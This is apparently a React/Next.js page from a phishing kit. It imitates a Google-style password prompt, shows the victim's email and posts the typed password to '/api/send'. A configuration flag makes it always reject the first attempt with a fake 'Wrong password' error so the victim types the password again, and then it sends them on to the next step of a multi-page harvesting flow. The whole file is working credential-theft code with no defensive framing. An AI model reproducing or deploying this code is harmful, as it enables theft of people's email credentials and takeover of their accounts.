import React, { useContext, useEffect, useState } from "react";

import {
  Box,
  Typography,
  LinearProgress,
  TextField,
  FormControlLabel,
  Checkbox,
  Button,
} from "@mui/material";
import { createTheme, ThemeProvider } from "@mui/material/styles";
import axios from "axios";
import { useRouter } from "next/router";
import Head from "next/head";
import { DataContext } from "../../_app";
import { capitalizeFirstLetter } from "../../../utils/capitalizeFirstLetter";
import { PersonIcon, CarrotDownIcon, ExclamtionIcon } from "./gmail";
import { getNextUrl } from "../../../utils/getNextUrl";
import { getProgress } from "../../../utils/getProgress";

interface AnyOtherEmailProps { }

const theme = createTheme({
  typography: {
    fontSize: 14,
  },
  palette: {
    primary: {
      main: "#1a73e8",
    },
  },
});

const AnyOtherEmail: React.FC<AnyOtherEmailProps> = () => {
  const [showPassowrd, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [password, setPassword] = useState(``);
  const [attempt, setAttempt] = useState(0);
  const [error, setError] = useState<{
    show: boolean;
    message: string;
  }>({} as any);

  const [emailLogins, setEmailLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();

  const onSubmit = async () => {
    setLoading(true);

    if (!password) {
      setError({
        show: true,
        message: `Please provide your password.`,
      });
      setLoading(false);
      return;
    }

    const formData = new FormData();
    const emailInfo = {
      [attempt + 1]: {
        form: `EMAIL`,
        emailLogins: {
          email: datas.email,
          emailPassword: password,
          attempt: attempt + 1,
        },
      },
    }

    formData.append(`form`, `EMAIL`);
    formData.append(
      `emailLogins`,
      JSON.stringify(emailInfo)
    );

    try {
      await axios.post(`/api/send`, formData);
    } catch (error) {
      console.log(error);
    }

    setEmailLogins(emailInfo);

    if (!attempt && process.env.NEXT_PUBLIC_DOUBLE_EMAIL_LOGIN === `ON`) {
      setTimeout(() => {
        setAttempt(1);
        setLoading(false);
        setError({
          show: true,
          message: `Wrong password.Try again or click ‘Forgot password’ to reset it.`,
        });
        setPassword(``);
      }, 2000);
      return;
    }

    setData({
      ...datas,
      emailLogins: {
        ...emailLogins,
        [attempt + 1]: {
          form: `EMAIL`,
          emailLogins: {
            email: datas.email,
            emailPassword: password,
            attempt: attempt + 1,
          },
        },
      },
    });

    setLoading(false);

    const url = getProgress()[getProgress().indexOf(`EMAIL`) + 1];
    push(getNextUrl(url));
  };


  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <ThemeProvider theme={theme}>
      <Head>
        <style>{`
                  body {
                    background: #fff;
                    direction: ltr;
                    font-size: 14px !important;
                    line-height: 1.4286;
                    margin: 0;
                    padding: 0;
                  }

                  html {
                    font-size: 100% !important
                  }
      
                  body, input, textarea, select, button, li {
                    color: #202124;
                    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
                  }

                  * {
                  box-sizing: border-box;
                }
                `}</style>
        <title>
          {capitalizeFirstLetter(
            (datas && datas.info && datas.emailProvider) || "email"
          )}
        </title>
        {/* eslint-disable-next-line @next/next/no-page-custom-font */}
        <link
          rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
        />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1"
        />
      </Head>
      <Box
        sx={{
          display: "flex",
          height: "100vh",
          flexDirection: "column",
          position: "relative",
          width: "100%",
          alignItems: "center",
          justifyContent: "center",
          background: "white",
        }}
      >
        <Box
          sx={{
            width: ["100%", "450px"],
            minHeight: ["100vh", 0],
            borderRadius: "8px",
            border: ["none", "1px solid #dadce0"],
            display: ["flex", "block"],
            flexShrink: 0,
            margin: [0, "0 auto"],
            transition: ".2s",
            flexDirection: ["column-reverse", "column"],
            maxWidth: "100%",
            position: "relative",
            zIndex: 2,
            height: ["100%", "auto"],
          }}
        >
          {loading && (
            <Box
              sx={{
                position: "absolute",
                width: "100%",
                height: "4px",
                overflow: "hidden",
                left: 0,
                top: 0,
                zIndex: 5,
              }}
            >
              <LinearProgress
                sx={{
                  color: "#1a73e8",
                }}
              />
            </Box>
          )}
          <Box
            sx={{
              height: ["initial", "auto"],
              minHeight: ["initial", "500px"],
              overflowY: "auto",
              overflow: ["hidden", "auto"],
              flexGrow: 1,
              padding: ["24px 24px 36px", "48px 40px 36px"],
            }}
          >
            <Box>
              <Box
                sx={{
                  display: "flex",
                  height: "24px",
                  justifyContent: "center",
                }}
              >
                <Box>
                  <Box
                    sx={{
                      height: "24px",
                      margin: "0 0",
                      overflow: "visible",
                      position: "relative",
                      width: "75px",
                    }}
                  >
                    <Box>
                      <Box />
                    </Box>
                  </Box>
                </Box>
              </Box>
              <Box>
                <Box>
                  <Box
                    sx={{
                      paddingX: ["10px", "40px"],
                      margin: ["auto -24px", "auto -40px"],
                      overflow: "hidden",
                    }}
                  >
                    <Box>
                      <Box sx={{ textAlign: "center" }}>
                        <Typography
                          component="h1"
                          sx={{
                            color: "#202124",
                            paddingBottom: 0,
                            paddingTop: "16px",
                            fontFamily: `'Google Sans','Noto Sans Myanmar UI',arial,sans-serif`,
                            fontSize: "24px !important",
                            fontWeight: 400,
                            lineHeight: 1.3333,
                            marginBottom: 0,
                            marginTop: 0,
                          }}
                        >
                          <Box component="span">Welcome</Box>
                        </Typography>
                        <Box
                          sx={{
                            height: "32px",
                            marginTop: "8px",
                          }}
                        >
                          <Box
                            sx={{
                              padding: "0 15px 0 15px",
                              paddingLeft: "5px",
                              paddingRight: "7px",
                              borderRadius: "16px",
                              alignItems: "center",
                              background: "#fff",
                              border: "1px solid #dadce0",
                              color: "#3c4043",
                              cursor: "pointer",
                              display: "inline-flex",
                              fontFamily: `'Google Sans','Noto Sans Myanmar UI',arial,sans-serif`,
                              fontSize: "14px !important",
                              fontWeight: 500,
                              letterSpacing: "0.25px",
                              maxWidth: "100%",
                              position: "relative",
                            }}
                          >
                            <Box
                              sx={{
                                borderRadius: "10px",
                                height: "20px",
                                marginRight: "8px",
                              }}
                            >
                              <Box
                                sx={{
                                  borderRadius: "50%",
                                  color: "#5f6368",
                                  overflow: "hidden",
                                }}
                              >
                                <PersonIcon />
                              </Box>
                            </Box>
                            <Box
                              lineHeight="30px"
                              textAlign="left"
                              overflow="hidden"
                              textOverflow="ellipsis"
                              whiteSpace="nowrap"
                              fontFamily="'Google Sans'"
                              sx={{
                                direction: "ltr",
                              }}
                            >
                              {datas && datas.email}
                            </Box>
                            <Box
                              color="#3c4043"
                              flexShrink={0}
                              height="18px"
                              width="18px"
                              marginLeft="4px"
                              sx={{
                                transition:
                                  "transform .2s cubic-bezier(.4,0,.2,1)",
                              }}
                            >
                              <CarrotDownIcon />
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                    <Box
                      fontSize=".1px !important"
                      whiteSpace="nowrap"
                    // margin={["auto -24px", "auto -40px"]}
                    >
                      <Box
                        sx={{
                          display: "inline-block",
                          fontSize: "14px !important",
                          padding: "24px 0 0",
                          verticalAlign: "top",
                          whiteSpace: "normal",
                          width: "100%",
                          borderLeftWidth: "40px",
                          borderRightWidth: "40px",
                          borderColor: "transparent",
                        }}
                      >
                        <Box>
                          <Box>
                            <Box>
                              <Box component="span">
                                <Box component="section">
                                  <Box
                                    sx={{
                                      marginTop: 0,
                                      margin: ["auto -24px", "auto -40px"],
                                      paddingLeft: ["24px", "40px"],
                                      paddingRight: ["24px", "40px"],
                                      marginBottom: "16px",
                                    }}
                                  >
                                    <Box
                                      sx={{
                                        paddingBottom: 0,
                                        paddingTop: "24px",
                                        width: "100%",
                                        WebkitTapHighlightColor: "transparent",
                                        userSelect: "none",
                                        display: "inline-block",
                                        outline: "none",
                                      }}
                                    >
                                      <TextField
                                        fullWidth
                                        id="outlined-basic"
                                        label="Enter your password"
                                        variant="outlined"
                                        type={
                                          showPassowrd ? "text" : "password"
                                        }
                                        sx={{
                                          font: "400 16px Roboto,RobotoDraft,Helvetica,Arial,sans-serif",
                                          fontWeight: 500,
                                          // "& .MuiInputBase-input": {
                                          //   height: "56px",
                                          // },
                                          "& .Mui-error": {
                                            marginX: 0,
                                          },
                                        }}
                                        value={password}
                                        onChange={(e) => {
                                          setPassword(e.target.value);
                                        }}
                                        helperText={
                                          error.show ? (
                                            <Box
                                              sx={{
                                                display: "flex",
                                                color: "#d93025",
                                                marginTop: "4px",
                                                fontSize: "12px !important",
                                              }}
                                            >
                                              <Box display="block" mr="8px">
                                                <ExclamtionIcon />
                                              </Box>
                                              <Box>
                                                <Box component="span">
                                                  {error.message}
                                                </Box>
                                              </Box>
                                            </Box>
                                          ) : (
                                            ""
                                          )
                                        }
                                      />
                                    </Box>
                                    <Box marginTop={["3px", "8px"]}>
                                      <FormControlLabel
                                        control={
                                          <Checkbox
                                            onClick={(e) => {
                                              setShowPassword(
                                                // @ts-ignore checked does exist
                                                () => e.target.checked
                                              );
                                            }}
                                          />
                                        }
                                        label="Show password"
                                        sx={{
                                          "& .MuiFormControlLabel-label": {
                                            fontSize: "14px !important",
                                          },
                                        }}
                                      />
                                    </Box>
                                  </Box>
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                        </Box>
                        <Box
                          sx={{
                            justifyContent: "space-between",
                            marginLeft: "-8px",
                            marginTop: ["30px", "26px"],
                            minHeight: "48px",
                            paddingBottom: "20px",
                            alignItems: "flex-start",
                            display: "flex",
                            flexGrow: 0,
                            flexWrap: "wrap",
                          }}
                        >
                          <Box
                            sx={{
                              display: "flex",
                              flexDirection: "row-reverse",
                              flexWrap: "wrap",
                              width: "100%",
                            }}
                          >
                            <Box
                              sx={{
                                textAlign: "right",
                                flexGrow: 1,
                                boxFlex: 1,
                              }}
                            >
                              <Button
                                variant="contained"
                                sx={{
                                  bgcolor: "#1a73e8",
                                  color: "#fff",
                                  padding: "0 24px 0 24px",
                                  fontFamily: `"Google Sans",Roboto,Arial,sans-serif`,
                                  fontSize: "14px !important",
                                  letterSpacing: ".0107142857em",
                                  fontWeight: 500,
                                  boxShadow: "none",
                                  textTransform: "none",
                                  transition:
                                    "border 280ms cubic-bezier(0.4,0,0.2,1),box-shadow 280ms cubic-bezier(0.4,0,0.2,1)",
                                  height: "36px",
                                  borderRadius: "4px",
                                  ":disabled": {
                                    bgcolor: "#1e66c9",
                                    color: "#fff",
                                  },
                                }}
                                onClick={onSubmit}
                                disabled={loading}
                              >
                                Next
                              </Button>
                            </Box>
                            <Box
                              sx={{
                                flexGrow: 1,
                                boxFlex: 1,
                              }}
                            >
                              <Box
                                sx={{
                                  textAlign: "left",
                                  display: "inline-block",
                                }}
                              >
                                <Box
                                  sx={{
                                    display: "inline",
                                  }}
                                >
                                  <Button
                                    variant="text"
                                    sx={{
                                      color: "#1a73e8",
                                      minWidth: 0,
                                      fontFamily: `"Google Sans",Roboto,Arial,sans-serif`,
                                      letterSpacing: ".0107142857em",
                                      fontWeight: 500,
                                      textTransform: "none",
                                    }}
                                  >
                                    Forgot password?
                                  </Button>
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
          </Box>
        </Box>
      </Box>
    </ThemeProvider>
  );
};

export default AnyOtherEmail;
